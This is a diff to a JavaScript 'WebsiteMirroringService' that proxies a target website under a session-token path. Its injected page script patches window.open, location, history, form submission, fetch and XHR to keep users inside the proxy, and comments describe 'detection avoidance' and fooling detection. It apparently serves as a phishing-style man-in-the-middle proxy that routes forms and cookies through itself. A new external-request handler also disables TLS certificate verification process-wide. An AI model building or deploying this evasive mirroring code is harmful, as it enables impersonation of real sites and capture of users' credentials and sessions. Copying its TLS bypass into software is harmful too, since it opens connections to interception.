@@ -564,6 +564,146 @@ class WebsiteMirroringService {
                     }, 1000);
                   }
                 }, true);
+                
+                // Advanced navigation interception
+                const interceptNavigation = function() {
+                  // Intercept window.open to prevent new tabs/windows
+                  const originalWindowOpen = window.open;
+                  window.open = function(url, target, features) {
+                    if (url) {
+                      // Redirect new window/tab attempts to current window
+                      let newUrl = url;
+                      if (url.startsWith('/') || url.startsWith(location.origin)) {
+                        // Internal URL - proxy it
+                        if (url.startsWith('/')) {
+                          newUrl = '/${sessionToken}' + url;
+                        } else {
+                          const urlObj = new URL(url);
+                          newUrl = '/${sessionToken}' + urlObj.pathname + urlObj.search + urlObj.hash;
+                        }
+                      } else {
+                        // External URL - proxy it
+                        newUrl = '/${sessionToken}/external?url=' + encodeURIComponent(url);
+                      }
+                      
+                      // Navigate in current window instead of opening new one
+                      location.href = newUrl;
+                      return window; // Return current window to fool detection
+                    }
+                    return originalWindowOpen.call(this, url, target, features);
+                  };
+                  
+                  // Intercept location changes
+                  const originalLocationAssign = location.assign;
+                  const originalLocationReplace = location.replace;
+                  
+                  location.assign = function(url) {
+                    if (url && !url.includes('/${sessionToken}')) {
+                      if (url.startsWith('/')) {
+                        url = '/${sessionToken}' + url;
+                      } else if (url.startsWith('http')) {
+                        const urlObj = new URL(url);
+                        if (urlObj.origin === location.origin.replace('/${sessionToken}', '')) {
+                          url = '/${sessionToken}' + urlObj.pathname + urlObj.search + urlObj.hash;
+                        } else {
+                          url = '/${sessionToken}/external?url=' + encodeURIComponent(url);
+                        }
+                      }
+                    }
+                    return originalLocationAssign.call(this, url);
+                  };
+                  
+                  location.replace = function(url) {
+                    if (url && !url.includes('/${sessionToken}')) {
+                      if (url.startsWith('/')) {
+                        url = '/${sessionToken}' + url;
+                      } else if (url.startsWith('http')) {
+                        const urlObj = new URL(url);
+                        if (urlObj.origin === location.origin.replace('/${sessionToken}', '')) {
+                          url = '/${sessionToken}' + urlObj.pathname + urlObj.search + urlObj.hash;
+                        } else {
+                          url = '/${sessionToken}/external?url=' + encodeURIComponent(url);
+                        }
+                      }
+                    }
+                    return originalLocationReplace.call(this, url);
+                  };
+                  
+                  // Intercept history API
+                  const originalPushState = history.pushState;
+                  const originalReplaceState = history.replaceState;
+                  
+                  history.pushState = function(state, title, url) {
+                    if (url && !url.includes('/${sessionToken}')) {
+                      if (url.startsWith('/')) {
+                        url = '/${sessionToken}' + url;
+                      }
+                    }
+                    return originalPushState.call(this, state, title, url);
+                  };
+                  
+                  history.replaceState = function(state, title, url) {
+                    if (url && !url.includes('/${sessionToken}')) {
+                      if (url.startsWith('/')) {
+                        url = '/${sessionToken}' + url;
+                      }
+                    }
+                    return originalReplaceState.call(this, state, title, url);
+                  };
+                  
+                  // Intercept programmatic form submissions
+                  const originalFormSubmit = HTMLFormElement.prototype.submit;
+                  HTMLFormElement.prototype.submit = function() {
+                    // Ensure form action is properly proxied
+                    if (this.action && !this.action.includes('/${sessionToken}')) {
+                      if (this.action.startsWith('/')) {
+                        this.action = '/${sessionToken}' + this.action;
+                      } else if (this.action.startsWith('http')) {
+                        const actionUrl = new URL(this.action);
+                        if (actionUrl.origin === location.origin.replace('/${sessionToken}', '')) {
+                          this.action = '/${sessionToken}' + actionUrl.pathname + actionUrl.search;
+                        }
+                      }
+                    }
+                    return originalFormSubmit.call(this);
+                  };
+                  
+                  // Intercept fetch API calls
+                  const originalFetch = window.fetch;
+                  window.fetch = function(url, options) {
+                    if (typeof url === 'string' && !url.includes('/${sessionToken}')) {
+                      if (url.startsWith('/')) {
+                        url = '/${sessionToken}' + url;
+                      } else if (url.startsWith('http')) {
+                        const urlObj = new URL(url);
+                        if (urlObj.origin === location.origin.replace('/${sessionToken}', '')) {
+                          url = '/${sessionToken}' + urlObj.pathname + urlObj.search;
+                        }
+                      }
+                    }
+                    return originalFetch.call(this, url, options);
+                  };
+                  
+                  // Intercept XMLHttpRequest
+                  const originalXHROpen = XMLHttpRequest.prototype.open;
+                  XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
+                    if (typeof url === 'string' && !url.includes('/${sessionToken}')) {
+                      if (url.startsWith('/')) {
+                        url = '/${sessionToken}' + url;
+                      } else if (url.startsWith('http')) {
+                        const urlObj = new URL(url);
+                        if (urlObj.origin === location.origin.replace('/${sessionToken}', '')) {
+                          url = '/${sessionToken}' + urlObj.pathname + urlObj.search;
+                        }
+                      }
+                    }
+                    return originalXHROpen.call(this, method, url, async, user, password);
+                  };
+                };
+                
+                // Initialize navigation interception
+                interceptNavigation();
+                
               } catch(err) {
                 // Silent fail
               }
@@ -594,7 +734,7 @@ class WebsiteMirroringService {
   rewriteUrls($, proxyPath, targetUrl, sessionToken) {
     const baseUrl = new URL(targetUrl);
     
-    // Rewrite all relative links
+    // Rewrite all relative links with enhanced handling
     $('a[href]').each((i, elem) => {
       const href = $(elem).attr('href');
       if (!href || href.startsWith('#') || href.startsWith('javascript:') || href.startsWith('mailto:')) return;
@@ -604,12 +744,23 @@ class WebsiteMirroringService {
         if (absoluteUrl.origin === baseUrl.origin) {
           const path = absoluteUrl.pathname + absoluteUrl.search + absoluteUrl.hash;
           $(elem).attr('href', `${proxyPath}${path}`);
+        } else {
+          // External links - proxy them through our system
+          const encodedUrl = encodeURIComponent(absoluteUrl.href);
+          $(elem).attr('href', `${proxyPath}/external?url=${encodedUrl}`);
         }
       } catch (e) {
         if (href.startsWith('/')) {
           $(elem).attr('href', `${proxyPath}${href}`);
+        } else {
+          // Relative paths
+          $(elem).attr('href', `${proxyPath}/${href}`);
         }
       }
+      
+      // Remove target="_blank" and similar attributes that open new windows
+      $(elem).removeAttr('target');
+      $(elem).removeAttr('rel');
     });
 
     // Fix forms with advanced detection avoidance
@@ -627,14 +778,24 @@ class WebsiteMirroringService {
         if (absoluteAction.origin === baseUrl.origin) {
           const path = absoluteAction.pathname + absoluteAction.search + absoluteAction.hash;
           $form.attr('action', `${proxyPath}${path}`);
+        } else if (action) {
+          // External form action
+          const encodedUrl = encodeURIComponent(absoluteAction.href);
+          $form.attr('action', `${proxyPath}/external?url=${encodedUrl}`);
         }
       } catch (e) {
         if (action === '') {
           $form.attr('action', '');
         } else if (action.startsWith('/')) {
           $form.attr('action', `${proxyPath}${action}`);
+        } else {
+          // Relative action
+          $form.attr('action', `${proxyPath}/${action}`);
         }
       }
+      
+      // Remove target="_blank" from forms
+      $form.removeAttr('target');
     });
 
     // Fix resources with intelligent handling
@@ -655,6 +816,9 @@ class WebsiteMirroringService {
           $(elem).attr(attrName, `https:${attrVal}`);
         } else if (attrVal.startsWith('/')) {
           $(elem).attr(attrName, `${proxyPath}${attrVal}`);
+        } else {
+          // Relative resources
+          $(elem).attr(attrName, `${proxyPath}/${attrVal}`);
         }
       }
     });
@@ -1620,6 +1784,31 @@ class WebsiteMirroringService {
       let requestPath = req.path.replace(`/${sessionToken}`, '') || '/';
       const queryString = req.url.includes('?') ? req.url.split('?')[1] : '';
       
+      // Handle external URL proxying
+      if (requestPath.startsWith('/external')) {
+        const urlParam = req.query.url;
+        if (urlParam) {
+          try {
+            const decodedUrl = decodeURIComponent(urlParam);
+            const externalUrl = new URL(decodedUrl);
+            
+            // Update session target URL to the external URL
+            session.targetUrl = externalUrl.origin;
+            
+            // Build the full external URL
+            const fullExternalUrl = decodedUrl;
+            console.log(`External URL redirect: ${req.originalUrl} -> ${fullExternalUrl}`);
+            
+            // Continue processing with the external URL
+            return this.handleExternalRequest(session, req, res, fullExternalUrl, cookieJar);
+          } catch (error) {
+            console.error('Error handling external URL:', error);
+            return res.status(400).send('Invalid external URL');
+          }
+        }
+        return res.status(400).send('Missing URL parameter');
+      }
+      
       // Remove tracking parameters from forwarded request
       let cleanQuery = '';
       if (queryString) {
@@ -2047,6 +2236,68 @@ class WebsiteMirroringService {
     } else {
       // Pass through non-HTML content unchanged
       res.send(response.data);
+    }
+  }
+
+  /**
+   * Handle external URL requests (different domains)
+   */
+  async handleExternalRequest(session, req, res, fullExternalUrl, cookieJar) {
+    try {
+      console.log(`Handling external request: ${fullExternalUrl}`);
+      
+      // Generate realistic browser headers for the external domain
+      const headers = this.generateRealistBrowserHeaders(req, fullExternalUrl, session.sessionToken);
+      
+      // Don't pass cookies to external domains for security
+      // Each domain should have its own cookie context
+      
+      // Make request to external website
+      const axiosConfig = {
+        method: req.method,
+        url: fullExternalUrl,
+        headers,
+        responseType: 'arraybuffer',
+        maxRedirects: 0,
+        validateStatus: () => true,
+        timeout: 30000,
+        decompress: true,
+        jar: cookieJar, // Use same jar but cookies will be domain-specific
+        withCredentials: true
+      };
+
+      // Handle SSL for external HTTPS URLs
+      if (fullExternalUrl.startsWith('https:')) {
+        const originalRejectUnauthorized = process.env.NODE_TLS_REJECT_UNAUTHORIZED;
+        process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
+        
+        try {
+          const response = await axiosInstance(axiosConfig);
+          
+          // Restore SSL setting
+          if (originalRejectUnauthorized !== undefined) {
+            process.env.NODE_TLS_REJECT_UNAUTHORIZED = originalRejectUnauthorized;
+          } else {
+            delete process.env.NODE_TLS_REJECT_UNAUTHORIZED;
+          }
+          
+          return await this.processResponse(response, session, req, res, session.sessionToken, fullExternalUrl);
+        } catch (error) {
+          // Restore SSL setting on error
+          if (originalRejectUnauthorized !== undefined) {
+            process.env.NODE_TLS_REJECT_UNAUTHORIZED = originalRejectUnauthorized;
+          } else {
+            delete process.env.NODE_TLS_REJECT_UNAUTHORIZED;
+          }
+          throw error;
+        }
+      } else {
+        const response = await axiosInstance(axiosConfig);
+        return await this.processResponse(response, session, req, res, session.sessionToken, fullExternalUrl);
+      }
+    } catch (error) {
+      console.error('Error handling external request:', error);
+      this.handleProxyError(error, res, session);
     }
   }
 }
